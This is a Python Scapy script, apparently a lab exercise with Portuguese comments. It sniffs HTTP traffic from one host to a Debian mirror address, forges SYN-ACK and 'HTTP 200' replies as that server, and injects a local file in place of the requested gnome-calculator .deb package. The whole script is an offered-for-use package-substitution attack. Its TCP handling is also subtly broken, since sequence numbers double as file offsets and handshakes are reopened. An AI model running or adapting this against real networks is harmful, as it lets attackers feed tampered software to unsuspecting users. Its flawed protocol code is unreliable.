#!/usr/bin/env python3

import threading
import socket
import time
from scapy.all import IP, TCP, Raw, send, sr1, sniff

IP_SOURCE = "172.19.0.99"

# IP e porta para o qual o servidor TCP irá responder
IP_DESTINO = "200.236.31.3"
PORTA_DESTINO = 8080

# Arquivo que será enviado como resposta
ARQUIVO = "gnome-calculator_43.0.1-2_amd64.deb"

#
http_aceito = False

# Função para monitorar a rede
def monitorar_rede():
    def interceptar_pacote(pkt):
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            ip_layer = pkt[IP]
            tcp_layer = pkt[TCP]
            if tcp_layer.dport == 80 and ip_layer.src == IP_SOURCE and ip_layer.dst == IP_DESTINO:
                if tcp_layer.flags & 0x02:  # Verifica se a bandeira SYN está ativada
                    print("[+] Recebido pacote SYN. Enviando resposta SYN-ACK.")
                    enviar_syn_ack(ip_layer, tcp_layer)
                
                elif tcp_layer.flags & 0x18:  # Verifica se a bandeira PUSH e ACK está ativada
                    print("[+] Recebido pacote PUSH. Interceptando GET request.")
                    interceptar_get_request(pkt)

                elif tcp_layer.flags & 0x10 and http_aceito:  # Verifica se a bandeira ACK está ativada
                    print("[+] Recebido pacote ACK")
                    handshake_tres_vias(pkt[IP], pkt[TCP])

                elif tcp_layer.flags & 0x10:  # Verifica se a bandeira ACK está ativada
                    print("[+] Recebido pacote ACK")


    sniff(prn=interceptar_pacote, filter="tcp port 80", store=0)


# Função para interceptar GET request e realizar o handshake de 3 vias antes de enviar o arquivo via TCP
def interceptar_get_request(pkt):
    if pkt.haslayer(Raw) and b"GET /debian/pool/main/g/gnome-calculator/gnome-calculator_43.0.1-2_amd64.deb" in pkt[Raw].load:
        print("[+] Interceptado GET request. Enviando status 200 como resposta.")
        enviar_status_200(pkt[IP], pkt[TCP])


# Função para enviar resposta SYN-ACK
def enviar_syn_ack(ip_layer, tcp_layer):
    ip_dst = ip_layer.src
    ip_src = ip_layer.dst
    port_dst = tcp_layer.sport
    port_src = tcp_layer.dport
    seq = tcp_layer.ack
    ack = tcp_layer.seq + 1

    ip_pkt = IP(dst=ip_dst, src=ip_src)
    tcp_pkt = TCP(dport=port_dst, sport=port_src, flags="SA", seq=seq, ack=ack)

    syn_ack_pkt = ip_pkt / tcp_pkt
    send(syn_ack_pkt, verbose=False)


# Função para enviar status 200 como resposta
def enviar_status_200(ip_layer, tcp_layer):
    ip_dst = ip_layer.src
    ip_src = ip_layer.dst
    port_dst = tcp_layer.sport
    port_src = tcp_layer.dport

    ip_pkt = IP(dst=ip_dst, src=ip_src)
    tcp_pkt = TCP(dport=port_dst, sport=port_src, flags="PA", seq=tcp_layer.ack, ack=tcp_layer.seq + 1)

    http_response = b"HTTP/1.1 200 OK\r\n\r\n"
    pkt = ip_pkt / tcp_pkt / http_response
    send(pkt, verbose=False)

    global http_aceito 
    http_aceito = True


# Função para iniciar o handshake de três vias
def handshake_tres_vias(ip_layer, tcp_layer):
    ip_dst = ip_layer.src
    ip_src = ip_layer.dst
    port_dst = tcp_layer.sport
    port_src = tcp_layer.dport

    # Envio do SYN
    syn_pkt = IP(dst=ip_dst, src=ip_src) / TCP(dport=port_dst, sport=port_src, flags="S")
    syn_ack = sr1(syn_pkt, verbose=False)

    # Envio do ACK
    ack_pkt = IP(dst=ip_dst, src=ip_src) / TCP(dport=port_dst, sport=port_src, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
    send(ack_pkt, verbose=False)

    # Envio do arquivo
    enviar_arquivo_tcp(ip_dst, ip_src, port_dst, port_src)


# Função para enviar o arquivo via TCP
def enviar_arquivo_tcp(ip_dst, ip_src, port_dst, port_src):
    with open(ARQUIVO, 'rb') as file:
        file_data = file.read()
        file_size = len(file_data)

        # Envio do SYN
        syn_pkt = IP(dst=ip_dst, src=ip_src) / TCP(dport=port_dst, sport=port_src, flags="S")
        syn_ack = sr1(syn_pkt, verbose=False)

        # Envio do ACK
        ack_pkt = IP(dst=ip_dst, src=ip_src) / TCP(dport=port_dst, sport=port_src, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ack_pkt, verbose=False)

        # Envio dos dados
        seq = syn_ack[TCP].ack
        while seq < file_size:
            chunk_size = min(1024, file_size - seq)
            data_pkt = IP(dst=ip_dst, src=ip_src) / TCP(dport=port_dst, sport=port_src, flags="PA", seq=seq, ack=syn_ack[TCP].seq + 1) / file_data[seq:seq+chunk_size]
            send(data_pkt, verbose=False)
            seq += chunk_size


# Inicia a thread para monitorar a rede
thread_monitorar_rede = threading.Thread(target=monitorar_rede)
thread_monitorar_rede.start()

print(f"Servidor TCP em execução em {IP_DESTINO}:{PORTA_DESTINO}")
